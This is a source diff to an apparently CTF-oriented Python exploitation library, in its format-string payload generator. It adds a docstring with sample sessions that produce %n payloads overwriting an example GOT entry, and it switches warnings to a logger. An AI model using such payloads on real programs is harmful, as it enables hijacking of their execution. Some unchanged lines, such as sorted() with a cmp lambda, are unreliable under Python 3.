@@ -3,7 +3,8 @@
 import sys
 import operator
 from collections import OrderedDict
-from ..misc.packing import *
+from roppy.misc.packing import *
+from roppy.log import log
 
 
 # INPUT for setitem:
@@ -32,6 +33,51 @@ def unpack(s, is64):
 
 
 class FormatStr:
+    """
+    A wrapper around https://github.com/hellman/libformatstr and ported to python3
+    will let you create the format string payload automatically.
+
+    Example:
+           Python 3.8.2 (default, Apr 27 2020, 15:53:34) 
+           [GCC 9.3.0] on linux
+           Type "help", "copyright", "credits" or "license" for more information.
+           >>> from roppy import *
+           >>> got = 0x601018
+           >>> write = 0x1337
+           >>> offset = 7
+           >>> fmtstr32(offset, {got: write})
+           Warning: Can't avoid null byte at address 0x601018
+           Warning: Payload contains NULL bytes.
+           b'%4919c%10$nA\x18\x10`\x00'
+           >>> fmtstr64(offset, {got: write})
+           Warning: Can't avoid null byte at address 0x601018
+           Warning: Payload contains NULL bytes.
+           b'%4919c%9$nAAAAAA\x18\x10`\x00\x00\x00\x00\x00'
+    
+    You can also define the starting length of the payload and the padding.
+    It works the both way around 32 bit and 64 bit format string.
+
+           >>> fmtstr32(offset, {got: write}, start_len=12, pad=10)
+           [WARN] Can't avoid null byte at address 0x601018
+           [WARN] Payload contains NULL bytes.
+           b'%4907c%10$nAAA\x18\x10`\x00'
+           >>> fmtstr32(offset, {got: write}, start_len=12, pad=20)
+           [WARN] Can't avoid null byte at address 0x601018
+           [WARN] Payload contains NULL bytes.
+           b'%4907c%10$nA\x18\x10`\x00'
+           >>> fmtstr64(offset, {got: write}, start_len=12, pad=20)
+           [WARN] Can't avoid null byte at address 0x601018
+           [WARN] Payload contains NULL bytes.
+           b'%4907c%8$nAA\x18\x10`\x00\x00\x00\x00\x00'
+           >>> fmtstr64(offset, {got: write}, start_len=12, pad=40)
+           [WARN] Can't avoid null byte at address 0x601018
+           [WARN] Payload contains NULL bytes.
+           b'%4907c%9$nAAAAAA\x18\x10`\x00\x00\x00\x00\x00'
+           >>> fmtstr64(offset, {got: write}, start_len=14, pad=40)
+           [WARN] Can't avoid null byte at address 0x601018
+           [WARN] Payload contains NULL bytes.
+           b'%4905c%9$nAAAAAA\x18\x10`\x00\x00\x00\x00\x00'
+    """
     def __init__(self, buffer_size=0, isx64=0, autosort=True):
         if autosort:
             self.mem = {}
@@ -183,7 +229,7 @@ class PayloadGenerator:
             # check if preceding address can be used
             if (addr - 1) not in self.mem or b"\x00" in pack(addr - 1, self.is64):
                 # to avoid null bytes in the last byte of address, set previous byte
-                warning("Can't avoid null byte at address " + hex(addr))
+                log.warning("Can't avoid null byte at address " + hex(addr))
             else:
                 return addr - 1
         return addr
@@ -219,7 +265,7 @@ class PayloadGenerator:
                 elif print_len >= 0:
                     payload += b"A" * print_len
                 else:
-                    warning("Can't write a value %08x (too small) %08x." % (value, print_len))
+                    log.warning("Can't write a value %08x (too small) %08x." % (value, print_len))
                     continue
 
                 modi = {
@@ -242,7 +288,7 @@ class PayloadGenerator:
             index = arg_index + len(payload) // align
 
         if b"\x00" in payload:
-            warning("Payload contains NULL bytes.")
+            log.warning("Payload contains NULL bytes.")
         return payload.ljust(self.buffer_size, b"\x90")
     
 
@@ -262,11 +308,6 @@ class Byte:
     def __int__(self):
         return self.value
 
-
-def warning(s):
-    print("Warning: "+s)
-
-
 def tuples_sorted_by_values(adict):
     """Return list of (key, value) pairs of @adict sorted by values."""
     return sorted(adict.items(), lambda x, y: cmp(x[1], y[1]))
@@ -278,7 +319,6 @@ def tuples_sorted_by_keys(adict):
 
 def fmtstr32(offset, writes: dict, start_len=0, pad=0, auto_sort=True):
     p = FormatStr(auto_sort)
-    print(writes)
     for addr, value in writes.items():
         p[addr] = value
     return p.payload(offset, pad, start_len)
